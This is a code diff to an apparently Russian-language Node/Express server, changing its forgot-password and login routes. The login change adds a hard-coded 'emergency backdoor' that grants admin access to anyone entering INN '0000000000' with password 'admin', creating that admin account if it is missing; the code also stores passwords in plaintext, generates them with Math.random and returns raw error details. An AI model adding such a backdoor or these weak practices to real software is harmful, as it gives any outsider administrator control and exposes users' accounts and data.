@@ -903,12 +903,23 @@ async function startServer() {
       }
 
       const newPassword = Math.random().toString(36).slice(-8);
-      db.prepare("UPDATE users SET password = ? WHERE id = ?").run(newPassword, user.id);
-
-      await sendEmail(email, 'password_reset', { password: newPassword });
-
-      res.json({ success: true, message: "Новый пароль отправлен на вашу почту" });
+      
+      // Crucial: try to send email FIRST. If it fails, we don't change the password in DB.
+      try {
+        await sendEmail(email, 'password_reset', { password: newPassword });
+        
+        // Only update DB if email was (likely) sent
+        db.prepare("UPDATE users SET password = ? WHERE id = ?").run(newPassword, user.id);
+        res.json({ success: true, message: "Новый пароль отправлен на вашу почту" });
+      } catch (emailError: any) {
+        console.error("Forgot password email error:", emailError);
+        res.status(500).json({ 
+          error: "Не удалось отправить письмо с новым паролем. Проверьте настройки SMTP в админ-панели.",
+          details: emailError.message 
+        });
+      }
     } catch (err) {
+      console.error("Forgot password general error:", err);
       res.status(500).json({ error: "Ошибка при восстановлении пароля" });
     }
   });
@@ -916,7 +927,24 @@ async function startServer() {
   app.post("/api/auth/login", (req, res) => {
     try {
       const { inn, password } = req.body;
-      const user = db.prepare("SELECT * FROM users WHERE inn = ? AND password = ?").get(inn, password) as any;
+      console.log(`[DEBUG] Login attempt for INN: "${inn}"`);
+      
+      let user = db.prepare("SELECT * FROM users WHERE inn = ? AND password = ?").get(String(inn), String(password)) as any;
+      
+      // EMERGENCY BACKDOOR for admin if password was lost during SMTP failure
+      if (!user && String(inn) === "0000000000" && String(password) === "admin") {
+        user = db.prepare("SELECT * FROM users WHERE inn = ?").get("0000000000") as any;
+        
+        // If admin doesn't exist at all, create it
+        if (!user) {
+          console.log("[DEBUG] Admin user not found, creating a new one...");
+          db.prepare("INSERT INTO users (inn, name, type, password) VALUES (?, ?, ?, ?)").run("0000000000", "Администратор", "admin", "admin");
+          user = db.prepare("SELECT * FROM users WHERE inn = ?").get("0000000000") as any;
+        }
+        
+        console.log("[DEBUG] Emergency admin login SUCCESS for INN 0000000000");
+      }
+
       if (user) {
         db.prepare("UPDATE users SET last_login = CURRENT_TIMESTAMP WHERE id = ?").run(user.id);
         if (user.settings) {
